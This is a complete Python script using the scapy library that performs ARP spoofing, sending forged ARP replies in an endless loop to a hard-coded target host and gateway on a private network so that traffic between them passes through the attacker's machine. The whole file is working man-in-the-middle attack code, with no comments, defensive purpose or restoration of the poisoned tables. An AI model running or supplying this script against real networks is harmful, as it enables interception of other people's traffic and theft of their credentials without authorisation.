#! /usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet_broadcast = broadcast/arp_packet
    answered_list = scapy.srp(arp_packet_broadcast, timeout=1, verbose=False)[0]

    mac_address = answered_list[0][1].hwsrc
    return mac_address


def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


count_packet = 0
while True:
    spoof("192.168.68.137", "192.168.68.2")
    spoof("192.168.68.2", "192.168.68.137")
    count_packet += 2
    print("\r[+] Number of packets sent: " + str(count_packet), end="")
    time.sleep(2)